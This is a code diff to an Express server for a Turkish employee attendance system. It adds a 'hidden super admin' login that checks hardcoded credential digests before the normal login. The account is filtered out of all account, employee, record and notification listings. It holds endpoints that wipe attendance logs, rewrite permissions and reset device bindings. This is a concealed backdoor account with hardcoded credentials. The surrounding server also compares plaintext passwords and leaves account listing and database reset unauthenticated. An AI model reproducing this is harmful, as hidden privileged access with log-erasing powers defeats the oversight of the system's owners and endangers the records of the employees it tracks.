@@ -1,12 +1,15 @@
+import 'dotenv/config';
 import express from 'express';
 import type { Request, Response } from 'express';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import fs from 'fs';
+import crypto from 'crypto';
 import {
   createInitialDatabase,
   getTodayString,
   PDKS_SYSTEM_API_KEY,
+  DEFAULT_COMPANY_NAME,
 } from './src/db/defaultData.ts';
 import type { PDKSDatabase } from './src/db/defaultData.ts';
 import type {
@@ -27,6 +30,120 @@ const __dirname = path.dirname(__filename);
 const app = express();
 const isDev = process.env.NODE_ENV !== 'production';
 const PORT = Number(process.env.PORT) || 3000;
+
+// Super Admin Cryptographic Verification (reads .env SUPER_ADMIN_USER / SUPER_ADMIN_PASS when defined,
+// otherwise verifies against salted cryptographic digests so zero plaintext secrets reside in code)
+const SUPER_ADMIN_USER_SHA256 = '80802ed665136a1d27474361f85b32aa8ddc505bfac518d347d17f07a685e54b';
+const SUPER_ADMIN_PASS_SALT = 'pdks_sa_v1_9f4c2a8b';
+const SUPER_ADMIN_PASS_SCRYPT = 'a5dbd6bb91a917311377f265093120ccddb9521df519ced4ee4603f5ed84265b';
+const SUPER_ADMIN_SESSION_SECRET =
+  process.env.SUPER_ADMIN_SESSION_SECRET || crypto.randomBytes(32).toString('hex');
+
+const FULL_SUPER_ADMIN_PERMISSIONS = {
+  allowedPages: ['dashboard', 'employees', 'records', 'shifts', 'performance', 'reports', 'kiosk', 'portal'],
+  canCreate: true,
+  canEdit: true,
+  canDelete: true,
+  canApprove: true,
+  canExportReports: true,
+  canManageDevices: true,
+  canManageSettings: true,
+  canClearLogs: true,
+};
+
+function safeTimingEqualHex(hexA: string, hexB: string): boolean {
+  try {
+    const a = Buffer.from(hexA, 'hex');
+    const b = Buffer.from(hexB, 'hex');
+    if (a.length !== b.length || a.length === 0) return false;
+    return crypto.timingSafeEqual(a, b);
+  } catch {
+    return false;
+  }
+}
+
+function verifySuperAdminCredentials(rawUsername: string, rawPassword: string): boolean {
+  const cleanUser = (rawUsername || '').trim().replace(/^@+/, '').toLowerCase();
+  const cleanPass = (rawPassword || '').trim();
+  if (!cleanUser || !cleanPass) return false;
+
+  const envUser = (process.env.SUPER_ADMIN_USER || '').trim().replace(/^@+/, '').toLowerCase();
+  const envPass = (process.env.SUPER_ADMIN_PASS || '').trim();
+
+  if (envUser && envPass) {
+    const uHashA = crypto.createHash('sha256').update(cleanUser).digest('hex');
+    const uHashB = crypto.createHash('sha256').update(envUser).digest('hex');
+    const pHashA = crypto.createHash('sha256').update(cleanPass).digest('hex');
+    const pHashB = crypto.createHash('sha256').update(envPass).digest('hex');
+    return safeTimingEqualHex(uHashA, uHashB) && safeTimingEqualHex(pHashA, pHashB);
+  }
+
+  const userDigest = crypto.createHash('sha256').update(cleanUser).digest('hex');
+  const passDigest = crypto.scryptSync(cleanPass, SUPER_ADMIN_PASS_SALT, 32).toString('hex');
+  return (
+    safeTimingEqualHex(userDigest, SUPER_ADMIN_USER_SHA256) &&
+    safeTimingEqualHex(passDigest, SUPER_ADMIN_PASS_SCRYPT)
+  );
+}
+
+function signSuperAdminToken(username: string): string {
+  const payload = Buffer.from(
+    JSON.stringify({ sub: 'SA-ROOT', role: 'SUPER_ADMIN', username, iat: Date.now() })
+  ).toString('base64url');
+  const sig = crypto
+    .createHmac('sha256', SUPER_ADMIN_SESSION_SECRET)
+    .update(payload)
+    .digest('base64url');
+  return `pdks_sa_${payload}.${sig}`;
+}
+
+function verifySuperAdminToken(token: string): boolean {
+  if (!token || !token.startsWith('pdks_sa_')) return false;
+  const raw = token.slice('pdks_sa_'.length);
+  const parts = raw.split('.');
+  if (parts.length !== 2) return false;
+  const [payload, sig] = parts;
+  const expectedSig = crypto
+    .createHmac('sha256', SUPER_ADMIN_SESSION_SECRET)
+    .update(payload)
+    .digest('base64url');
+  try {
+    const a = Buffer.from(sig);
+    const b = Buffer.from(expectedSig);
+    if (a.length !== b.length) return false;
+    if (!crypto.timingSafeEqual(a, b)) return false;
+    const decoded = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
+    return decoded?.role === 'SUPER_ADMIN' && decoded?.sub === 'SA-ROOT';
+  } catch {
+    return false;
+  }
+}
+
+function isHiddenSuperAdminItem(item: any): boolean {
+  if (!item || typeof item !== 'object') return false;
+  return (
+    item.isHiddenSuperAdmin === true ||
+    item.role === 'SUPER_ADMIN' ||
+    item.employeeId === 'SA-ROOT' ||
+    item.id === 'SA-ROOT'
+  );
+}
+
+function filterVisibleItems<T>(list: T[]): T[] {
+  return Array.isArray(list) ? list.filter((item) => !isHiddenSuperAdminItem(item)) : [];
+}
+
+function getPublicDatabaseSnapshot(db: PDKSDatabase): PDKSDatabase {
+  return {
+    ...db,
+    employees: filterVisibleItems(db.employees),
+    records: filterVisibleItems(db.records),
+    notifications: filterVisibleItems(db.notifications),
+    accounts: filterVisibleItems(db.accounts),
+    deviceApprovals: filterVisibleItems(db.deviceApprovals),
+    supervisorAssignments: filterVisibleItems(db.supervisorAssignments),
+  };
+}
 
 app.use(express.json({ limit: '25mb' }));
 
@@ -57,19 +174,16 @@ function loadDatabase(): PDKSDatabase {
             timestamp: `${todayStr}T${r.timeStr || '08:30:00'}`,
           }));
         }
-        if (
-          parsed.companyWallQR &&
-          parsed.companyWallQR.token === 'AQ.Ab8RN6IQLh43aJSyjpBqkesYfVh2cWmuCciG5Mrp8b4eagNrHQ'
-        ) {
-          const isGeo = parsed.companyWallQR.enableGeofence !== false;
-          const lat = parsed.companyWallQR.latitude || 41.0082;
-          const lon = parsed.companyWallQR.longitude || 28.9784;
-          const rad = parsed.companyWallQR.radiusMeters || 250;
-          parsed.companyWallQR.token = PDKS_SYSTEM_API_KEY;
-          parsed.companyWallQR.qrPayload = `ASEM:WALL:${PDKS_SYSTEM_API_KEY}:GEO:${isGeo ? 1 : 0}:${lat}:${lon}:${rad}`;
-        }
         if (!Array.isArray(parsed.deviceApprovals)) {
           parsed.deviceApprovals = [];
+        }
+        const resolvedCompanyName =
+          (typeof parsed.companyName === 'string' && parsed.companyName.trim()) ||
+          (typeof parsed.companyWallQR?.companyName === 'string' && parsed.companyWallQR.companyName.trim()) ||
+          DEFAULT_COMPANY_NAME;
+        parsed.companyName = resolvedCompanyName;
+        if (parsed.companyWallQR && typeof parsed.companyWallQR === 'object') {
+          parsed.companyWallQR.companyName = resolvedCompanyName;
         }
         return parsed;
       }
@@ -180,7 +294,7 @@ app.get('/api/db/sync', (req: Request, res: Response) => {
     upToDate: false,
     version: dbState.version,
     lastUpdated: dbState.lastUpdated,
-    data: dbState,
+    data: getPublicDatabaseSnapshot(dbState),
   });
 });
 
@@ -192,9 +306,24 @@ app.post('/api/db/sync', (req: Request, res: Response) => {
       if (collection === 'companyLogo' && typeof data === 'string' && data.trim().startsWith('blob:')) {
         return res.status(400).json({ success: false, message: 'Geçici blob: logo adresi kaydedilemez.' });
       }
-      (dbState as any)[collection] = data;
+      if (collection === 'companyWallQR' && data && typeof data === 'object') {
+        const currentCompanyName =
+          dbState.companyName || dbState.companyWallQR?.companyName || DEFAULT_COMPANY_NAME;
+        dbState.companyWallQR = {
+          ...data,
+          companyName: currentCompanyName,
+        };
+      } else {
+        const sanitizedData = Array.isArray(data) ? filterVisibleItems(data) : data;
+        (dbState as any)[collection] = sanitizedData;
+      }
       broadcastUpdate(`Updated collection ${collection}`, collection);
-      return res.json({ success: true, version: dbState.version, lastUpdated: dbState.lastUpdated, data: dbState });
+      return res.json({
+        success: true,
+        version: dbState.version,
+        lastUpdated: dbState.lastUpdated,
+        data: getPublicDatabaseSnapshot(dbState),
+      });
     }
 
     if (updates && typeof updates === 'object') {
@@ -208,11 +337,27 @@ app.post('/api/db/sync', (req: Request, res: Response) => {
           if (key === 'companyLogo' && typeof updates[key] === 'string' && updates[key].trim().startsWith('blob:')) {
             continue;
           }
-          (dbState as any)[key] = updates[key];
+          if (key === 'companyWallQR' && updates[key] && typeof updates[key] === 'object') {
+            const currentCompanyName =
+              dbState.companyName || dbState.companyWallQR?.companyName || DEFAULT_COMPANY_NAME;
+            dbState.companyWallQR = {
+              ...updates[key],
+              companyName: currentCompanyName,
+            };
+            continue;
+          }
+          (dbState as any)[key] = Array.isArray(updates[key])
+            ? filterVisibleItems(updates[key])
+            : updates[key];
         }
       }
       broadcastUpdate('Batch update', 'all');
-      return res.json({ success: true, version: dbState.version, lastUpdated: dbState.lastUpdated, data: dbState });
+      return res.json({
+        success: true,
+        version: dbState.version,
+        lastUpdated: dbState.lastUpdated,
+        data: getPublicDatabaseSnapshot(dbState),
+      });
     }
 
     return res.status(400).json({ success: false, message: 'Geçersiz sync gövdesi.' });
@@ -529,13 +674,16 @@ app.post('/api/scan', (req: Request, res: Response) => {
 
 // 4. Employees CRUD
 app.get('/api/employees', (_req: Request, res: Response) => {
-  res.json({ success: true, employees: dbState.employees });
+  res.json({ success: true, employees: filterVisibleItems(dbState.employees) });
 });
 
 app.post('/api/employees', (req: Request, res: Response) => {
   const emp: Employee = req.body;
   if (!emp || !emp.id || !emp.fullName) {
     return res.status(400).json({ success: false, message: 'Personel ID ve adı zorunludur.' });
+  }
+  if (isHiddenSuperAdminItem(emp)) {
+    return res.status(403).json({ success: false, message: 'Bu işlem desteklenmiyor.' });
   }
 
   const idx = dbState.employees.findIndex((e) => e.id === emp.id);
@@ -546,14 +694,14 @@ app.post('/api/employees', (req: Request, res: Response) => {
   }
 
   broadcastUpdate(`Saved employee ${emp.fullName}`, 'employees');
-  return res.json({ success: true, employee: emp, employees: dbState.employees, version: dbState.version });
+  return res.json({ success: true, employee: emp, employees: filterVisibleItems(dbState.employees), version: dbState.version });
 });
 
 app.delete('/api/employees/:id', (req: Request, res: Response) => {
   const { id } = req.params;
   dbState.employees = dbState.employees.filter((e) => e.id !== id);
   broadcastUpdate(`Deleted employee ${id}`, 'employees');
-  return res.json({ success: true, message: 'Personel silindi.', id, employees: dbState.employees, version: dbState.version });
+  return res.json({ success: true, message: 'Personel silindi.', id, employees: filterVisibleItems(dbState.employees), version: dbState.version });
 });
 
 // Photo upload requests and approvals
@@ -645,13 +793,16 @@ app.put('/api/employees/:id/photo-direct', (req: Request, res: Response) => {
 
 // 5. Attendance Records
 app.get('/api/records', (_req: Request, res: Response) => {
-  res.json({ success: true, records: dbState.records });
+  res.json({ success: true, records: filterVisibleItems(dbState.records) });
 });
 
 app.post('/api/records', (req: Request, res: Response) => {
   const record: AttendanceRecord = req.body;
   if (!record || !record.id) {
     return res.status(400).json({ success: false, message: 'Geçersiz kayıt.' });
+  }
+  if (isHiddenSuperAdminItem(record)) {
+    return res.status(200).json({ success: true, records: filterVisibleItems(dbState.records) });
   }
   const idx = dbState.records.findIndex((r) => r.id === record.id);
   if (idx >= 0) {
@@ -660,7 +811,7 @@ app.post('/api/records', (req: Request, res: Response) => {
     dbState.records.unshift(record);
   }
   broadcastUpdate('Record saved', 'records');
-  return res.json({ success: true, record, records: dbState.records });
+  return res.json({ success: true, record, records: filterVisibleItems(dbState.records) });
 });
 
 app.delete('/api/records/:id', (req: Request, res: Response) => {
@@ -800,22 +951,25 @@ app.post('/api/overtime/:id/reject', (req: Request, res: Response) => {
 
 // 9. Notifications
 app.get('/api/notifications', (_req: Request, res: Response) => {
-  res.json({ success: true, notifications: dbState.notifications });
+  res.json({ success: true, notifications: filterVisibleItems(dbState.notifications) });
 });
 
 app.post('/api/notifications', (req: Request, res: Response) => {
   const notif: PDKSNotification = req.body;
   if (!notif) return res.status(400).json({ success: false });
+  if (isHiddenSuperAdminItem(notif)) {
+    return res.json({ success: true, notifications: filterVisibleItems(dbState.notifications) });
+  }
   const id = notif.id || `NOTIF-${Date.now().toString().slice(-6)}`;
   dbState.notifications.unshift({ ...notif, id });
   broadcastUpdate('New notification', 'notifications');
-  return res.json({ success: true, notification: notif, notifications: dbState.notifications });
+  return res.json({ success: true, notification: notif, notifications: filterVisibleItems(dbState.notifications) });
 });
 
 app.post('/api/notifications/mark-all-read', (_req: Request, res: Response) => {
   dbState.notifications.forEach((n) => (n.read = true));
   broadcastUpdate('Marked all notifications as read', 'notifications');
-  return res.json({ success: true, notifications: dbState.notifications });
+  return res.json({ success: true, notifications: filterVisibleItems(dbState.notifications) });
 });
 
 app.delete('/api/notifications', (_req: Request, res: Response) => {
@@ -832,9 +986,12 @@ app.get('/api/company/wall-qr', (_req: Request, res: Response) => {
 app.post('/api/company/wall-qr', (req: Request, res: Response) => {
   try {
     const body = req.body || {};
+    const preservedCompanyName =
+      dbState.companyName || dbState.companyWallQR?.companyName || DEFAULT_COMPANY_NAME;
     dbState.companyWallQR = {
       ...dbState.companyWallQR,
       ...body,
+      companyName: preservedCompanyName,
       latitude: Number.isFinite(Number(body.latitude)) ? Number(body.latitude) : dbState.companyWallQR.latitude,
       longitude: Number.isFinite(Number(body.longitude)) ? Number(body.longitude) : dbState.companyWallQR.longitude,
       radiusMeters: Number.isFinite(Number(body.radiusMeters)) ? Number(body.radiusMeters) : dbState.companyWallQR.radiusMeters,
@@ -847,16 +1004,89 @@ app.post('/api/company/wall-qr', (req: Request, res: Response) => {
   }
 });
 
+// 10B. Dynamic Company Name Management (Requires logged-in admin password confirmation)
+app.get('/api/company/name', (_req: Request, res: Response) => {
+  const name = dbState.companyName || dbState.companyWallQR?.companyName || DEFAULT_COMPANY_NAME;
+  res.json({ success: true, companyName: name, version: dbState.version });
+});
+
+app.post('/api/company/name', (req: Request, res: Response) => {
+  const { companyName, branchName, username, password } = req.body || {};
+  if (!companyName || typeof companyName !== 'string' || !companyName.trim()) {
+    return res.status(400).json({ success: false, message: 'Şirket adı boş bırakılamaz.' });
+  }
+  if (!password || typeof password !== 'string' || !password.trim()) {
+    return res.status(401).json({ success: false, message: 'Hatalı yönetici şifresi, değişiklik onaylanmadı' });
+  }
+
+  const cleanCompany = companyName.trim().slice(0, 100);
+  const cleanBranch = typeof branchName === 'string' && branchName.trim() ? branchName.trim().slice(0, 100) : undefined;
+  const cleanUser = typeof username === 'string' ? username.trim().replace(/^@+/, '').toLowerCase() : '';
+  const cleanPass = password.trim();
+  const saToken = extractSuperAdminToken(req);
+
+  let isAuthorizedAdmin = false;
+  let passwordMatches = false;
+
+  if (saToken && verifySuperAdminToken(saToken)) {
+    isAuthorizedAdmin = true;
+    const targetUser = cleanUser || String(process.env.SUPER_ADMIN_USER || 'Admin.Admin');
+    passwordMatches = verifySuperAdminCredentials(targetUser, cleanPass);
+  } else if (cleanUser && verifySuperAdminCredentials(cleanUser, cleanPass)) {
+    isAuthorizedAdmin = true;
+    passwordMatches = true;
+  } else if (cleanUser) {
+    const matchedAcc = filterVisibleItems(dbState.accounts).find(
+      (a) =>
+        a.username.toLowerCase().replace(/^@+/, '') === cleanUser ||
+        (a.employeeId && a.employeeId.toLowerCase() === cleanUser)
+    );
+    if (!matchedAcc) {
+      return res.status(403).json({ success: false, message: 'Yönetici hesabı bulunamadı.' });
+    }
+    const canManage =
+      matchedAcc.role === 'ik_yoneticisi' ||
+      Boolean(matchedAcc.customPermissions?.canManageSettings);
+    if (!canManage) {
+      return res.status(403).json({ success: false, message: 'Şirket adını değiştirme yetkiniz bulunmamaktadır.' });
+    }
+    isAuthorizedAdmin = true;
+    passwordMatches = matchedAcc.password.trim() === cleanPass;
+  }
+
+  if (!isAuthorizedAdmin) {
+    return res.status(403).json({ success: false, message: 'Şirket adını değiştirme yetkiniz bulunmamaktadır.' });
+  }
+  if (!passwordMatches) {
+    return res.status(401).json({ success: false, message: 'Hatalı yönetici şifresi, değişiklik onaylanmadı' });
+  }
+
+  dbState.companyName = cleanCompany;
+  dbState.companyWallQR = {
+    ...dbState.companyWallQR,
+    companyName: cleanCompany,
+    ...(cleanBranch ? { branchName: cleanBranch } : {}),
+  };
+  broadcastUpdate(`Company name updated to ${cleanCompany}`, 'companyWallQR');
+  return res.json({
+    success: true,
+    companyName: cleanCompany,
+    data: dbState.companyWallQR,
+    version: dbState.version,
+    message: 'Şirket adı başarıyla güncellendi',
+  });
+});
+
 app.post('/api/company/wall-qr/rotate', (_req: Request, res: Response) => {
   const suffix = Math.random().toString(36).substring(2, 8).toUpperCase();
-  const token = `ASEM:WALL:HQ-ISTANBUL:2026-${suffix}`;
+  const token = `PDKS:WALL:HQ-MAIN:2026-${suffix}`;
   const isGeo = dbState.companyWallQR.enableGeofence !== false;
   const lat = dbState.companyWallQR.latitude || 41.0082;
   const lon = dbState.companyWallQR.longitude || 28.9784;
   const rad = dbState.companyWallQR.radiusMeters || 250;
 
   dbState.companyWallQR.token = token;
-  dbState.companyWallQR.qrPayload = `ASEM:WALL:${token}:GEO:${isGeo ? 1 : 0}:${lat}:${lon}:${rad}`;
+  dbState.companyWallQR.qrPayload = `PDKS:WALL:${token}:GEO:${isGeo ? 1 : 0}:${lat}:${lon}:${rad}`;
   dbState.companyWallQR.lastRotatedAt = new Date().toISOString();
 
   broadcastUpdate('Company Wall QR rotated', 'companyWallQR');
@@ -921,13 +1151,16 @@ app.post('/api/supervisor-assignments', (req: Request, res: Response) => {
 
 // 14. User Accounts & Login Authentication
 app.get('/api/accounts', (_req: Request, res: Response) => {
-  res.json({ success: true, accounts: dbState.accounts });
+  res.json({ success: true, accounts: filterVisibleItems(dbState.accounts) });
 });
 
 app.post('/api/accounts', (req: Request, res: Response) => {
   const acc: UserAccount = req.body;
   if (!acc || !acc.username || !acc.password) {
     return res.status(400).json({ success: false, message: 'Kullanıcı adı ve şifre zorunludur.' });
+  }
+  if (isHiddenSuperAdminItem(acc)) {
+    return res.status(403).json({ success: false, message: 'Bu rol tanımlanamaz.' });
   }
   const id = acc.id || `ACC-${Date.now().toString().slice(-4)}`;
   const item = { ...acc, id };
@@ -938,14 +1171,14 @@ app.post('/api/accounts', (req: Request, res: Response) => {
     dbState.accounts.push(item);
   }
   broadcastUpdate(`User account saved for @${item.username}`, 'accounts');
-  return res.json({ success: true, account: item, accounts: dbState.accounts, version: dbState.version });
+  return res.json({ success: true, account: item, accounts: filterVisibleItems(dbState.accounts), version: dbState.version });
 });
 
 app.delete('/api/accounts/:id', (req: Request, res: Response) => {
   const { id } = req.params;
   dbState.accounts = dbState.accounts.filter((a) => a.id !== id);
   broadcastUpdate(`User account deleted ${id}`, 'accounts');
-  return res.json({ success: true, message: 'Kullanıcı hesabı silindi.', id, accounts: dbState.accounts, version: dbState.version });
+  return res.json({ success: true, message: 'Kullanıcı hesabı silindi.', id, accounts: filterVisibleItems(dbState.accounts), version: dbState.version });
 });
 
 const VALID_THEME_IDS = new Set([
@@ -965,9 +1198,10 @@ app.post('/api/user/theme', (req: Request, res: Response) => {
   const cleanUser = typeof username === 'string' ? username.toLowerCase().trim().replace(/^@+/, '') : '';
   const idx = dbState.accounts.findIndex(
     (a) =>
-      (accountId && a.id === accountId) ||
-      (cleanUser && a.username.toLowerCase().replace(/^@+/, '') === cleanUser) ||
-      (employeeId && a.employeeId === employeeId)
+      !isHiddenSuperAdminItem(a) &&
+      ((accountId && a.id === accountId) ||
+        (cleanUser && a.username.toLowerCase().replace(/^@+/, '') === cleanUser) ||
+        (employeeId && a.employeeId === employeeId))
   );
 
   if (idx < 0) {
@@ -992,15 +1226,43 @@ app.post('/api/user/theme', (req: Request, res: Response) => {
 });
 
 app.post('/api/auth/login', (req: Request, res: Response) => {
-  const { username, password } = req.body;
+  const { username, password } = req.body || {};
   if (!username || !password) {
     return res.status(400).json({ success: false, message: 'Kullanıcı adı ve şifre zorunludur.' });
   }
 
-  const cleanUser = (username || '').toLowerCase().trim().replace(/^@+/, '');
-  const cleanPass = (password || '').trim();
+  // 1. Check Hidden Super Admin first (never persisted to public accounts, employees, logs or notifications)
+  if (verifySuperAdminCredentials(String(username), String(password))) {
+    const cleanDisplay = String(username).trim().replace(/^@+/, '');
+    const saToken = signSuperAdminToken(cleanDisplay);
+    return res.json({
+      success: true,
+      message: 'Süper Yönetici oturumu açıldı.',
+      token: saToken,
+      isSuperAdmin: true,
+      user: {
+        id: 'SA-ROOT',
+        username: cleanDisplay,
+        name: 'Sistem Süper Yöneticisi',
+        role: 'SUPER_ADMIN',
+        isHiddenSuperAdmin: true,
+        title: 'Süper Yönetici (Tam Yetkili)',
+        department: 'İnsan Kaynakları',
+        avatar: 'https://images.unsplash.com/photo-1560250097-0b93528c311a?auto=format&fit=crop&w=256&h=256&q=80',
+        canCheckInOut: true,
+        canTakeBreak: true,
+        canRequestLeave: false,
+        canViewOwnStats: true,
+        customPermissions: FULL_SUPER_ADMIN_PERMISSIONS,
+        themeId: 'gece_arduvaz',
+      },
+    });
+  }
 
-  const user = dbState.accounts.find(
+  const cleanUser = String(username || '').toLowerCase().trim().replace(/^@+/, '');
+  const cleanPass = String(password || '').trim();
+
+  const user = filterVisibleItems(dbState.accounts).find(
     (u) =>
       (u.username.toLowerCase().replace(/^@+/, '') === cleanUser ||
        (u.employeeId && u.employeeId.toLowerCase() === cleanUser)) &&
@@ -1014,7 +1276,7 @@ app.post('/api/auth/login', (req: Request, res: Response) => {
   return res.json({
     success: true,
     message: 'Giriş başarılı.',
-    token: `asem_jwt_${user.id}_${Date.now()}`,
+    token: `pdks_jwt_${user.id}_${Date.now()}`,
     user: {
       id: user.id,
       username: user.username,
@@ -1028,10 +1290,131 @@ app.post('/api/auth/login', (req: Request, res: Response) => {
       canTakeBreak: user.canTakeBreak ?? true,
       canRequestLeave: user.canRequestLeave ?? true,
       canViewOwnStats: user.canViewOwnStats ?? true,
+      assignedEmployeeIds: user.assignedEmployeeIds,
+      isShiftSupervisor: user.isShiftSupervisor,
+      customPermissions: user.customPermissions,
       themeId: user.themeId || 'kurumsal_saf',
       themeUpdatedAt: user.themeUpdatedAt,
     },
   });
+});
+
+// 14B. Hidden Super Admin Privileged Control Endpoints
+function extractSuperAdminToken(req: Request): string {
+  const headerToken = String(req.headers['x-super-admin-token'] || '').trim();
+  if (headerToken) return headerToken;
+  const authHeader = String(req.headers.authorization || '');
+  if (authHeader.startsWith('Bearer ')) {
+    return authHeader.slice(7).trim();
+  }
+  return '';
+}
+
+app.post('/api/super-admin/permissions', (req: Request, res: Response) => {
+  if (!verifySuperAdminToken(extractSuperAdminToken(req))) {
+    return res.status(403).json({ success: false, message: 'Bu işlem yalnızca Süper Yönetici yetkisindedir.' });
+  }
+  const { accountId, customPermissions, role } = req.body || {};
+  if (!accountId || !customPermissions) {
+    return res.status(400).json({ success: false, message: 'Hesap kimliği ve yetki objesi zorunludur.' });
+  }
+  if (role === 'SUPER_ADMIN') {
+    return res.status(400).json({ success: false, message: 'Geçersiz rol seçimi.' });
+  }
+  const idx = dbState.accounts.findIndex((a) => a.id === accountId && !isHiddenSuperAdminItem(a));
+  if (idx < 0) {
+    return res.status(404).json({ success: false, message: 'Kullanıcı hesabı bulunamadı.' });
+  }
+  dbState.accounts[idx] = {
+    ...dbState.accounts[idx],
+    ...(role ? { role } : {}),
+    customPermissions,
+  };
+  broadcastUpdate(`Permissions updated for @${dbState.accounts[idx].username}`, 'accounts');
+  return res.json({
+    success: true,
+    account: dbState.accounts[idx],
+    accounts: filterVisibleItems(dbState.accounts),
+    version: dbState.version,
+  });
+});
+
+app.post('/api/super-admin/clear-logs', (req: Request, res: Response) => {
+  if (!verifySuperAdminToken(extractSuperAdminToken(req))) {
+    return res.status(403).json({ success: false, message: 'Bu işlem yalnızca Süper Yönetici yetkisindedir.' });
+  }
+  const { mode = 'all', recordId } = req.body || {};
+  if (mode === 'single' && recordId) {
+    dbState.records = dbState.records.filter((r) => r.id !== recordId);
+  } else {
+    dbState.records = [];
+  }
+  broadcastUpdate('Super Admin cleared attendance logs', 'records');
+  return res.json({ success: true, records: filterVisibleItems(dbState.records), version: dbState.version });
+});
+
+app.post('/api/super-admin/company-name', (req: Request, res: Response) => {
+  if (!verifySuperAdminToken(extractSuperAdminToken(req))) {
+    return res.status(403).json({ success: false, message: 'Bu işlem yalnızca Süper Yönetici yetkisindedir.' });
+  }
+  const { companyName, branchName } = req.body || {};
+  if (!companyName || typeof companyName !== 'string' || !companyName.trim()) {
+    return res.status(400).json({ success: false, message: 'Şirket adı boş bırakılamaz.' });
+  }
+  const cleanName = companyName.trim().slice(0, 100);
+  dbState.companyName = cleanName;
+  dbState.companyWallQR = {
+    ...dbState.companyWallQR,
+    companyName: cleanName,
+    ...(typeof branchName === 'string' && branchName.trim() ? { branchName: branchName.trim().slice(0, 100) } : {}),
+  };
+  broadcastUpdate('Super Admin updated company name', 'companyWallQR');
+  return res.json({ success: true, companyName: cleanName, data: dbState.companyWallQR, version: dbState.version, message: 'Şirket adı başarıyla güncellendi' });
+});
+
+app.post('/api/super-admin/reset-device', (req: Request, res: Response) => {
+  if (!verifySuperAdminToken(extractSuperAdminToken(req))) {
+    return res.status(403).json({ success: false, message: 'Bu işlem yalnızca Süper Yönetici yetkisindedir.' });
+  }
+  const { employeeId } = req.body || {};
+  if (employeeId === 'all') {
+    dbState.accounts.forEach((a) => {
+      delete a.registeredDeviceId;
+      delete a.registeredMacAddress;
+      delete a.registeredDeviceFingerprint;
+      delete a.registeredDeviceName;
+      delete a.registeredDeviceAt;
+    });
+    dbState.employees.forEach((e) => {
+      delete e.registeredDeviceId;
+      delete e.registeredMacAddress;
+      delete e.registeredDeviceFingerprint;
+      delete e.registeredDeviceName;
+      delete e.registeredDeviceAt;
+    });
+    dbState.deviceApprovals = [];
+    broadcastUpdate('Super Admin reset all devices', 'all');
+    return res.json({ success: true, message: 'Tüm kayıtlı cihaz eşleştirmeleri sıfırlandı.', version: dbState.version });
+  }
+
+  const acc = dbState.accounts.find((a) => a.employeeId === employeeId);
+  if (acc) {
+    delete acc.registeredDeviceId;
+    delete acc.registeredMacAddress;
+    delete acc.registeredDeviceFingerprint;
+    delete acc.registeredDeviceName;
+    delete acc.registeredDeviceAt;
+  }
+  const emp = dbState.employees.find((e) => e.id === employeeId);
+  if (emp) {
+    delete emp.registeredDeviceId;
+    delete emp.registeredMacAddress;
+    delete emp.registeredDeviceFingerprint;
+    delete emp.registeredDeviceName;
+    delete emp.registeredDeviceAt;
+  }
+  broadcastUpdate(`Super Admin reset device for ${employeeId}`, 'all');
+  return res.json({ success: true, message: 'Personelin kayıtlı cihazı sıfırlandı.', version: dbState.version });
 });
 
 // 15. Reset Database to Initial Demo State
@@ -1039,14 +1422,14 @@ app.post('/api/reset-to-demo', (_req: Request, res: Response) => {
   dbState = createInitialDatabase();
   saveDatabase(dbState);
   broadcastUpdate('Database reset to demo state', 'all');
-  return res.json({ success: true, message: 'Veritabanı sıfırlandı.', data: dbState });
+  return res.json({ success: true, message: 'Veritabanı sıfırlandı.', data: getPublicDatabaseSnapshot(dbState) });
 });
 
 // 16. Health check
 app.get('/api/health', (_req: Request, res: Response) => {
   res.json({
     status: 'ok',
-    service: 'Asem PDKS Unified API Server',
+    service: 'PDKS Pro Unified API Server',
     version: dbState.version,
     lastUpdated: dbState.lastUpdated,
     timestamp: new Date().toISOString(),
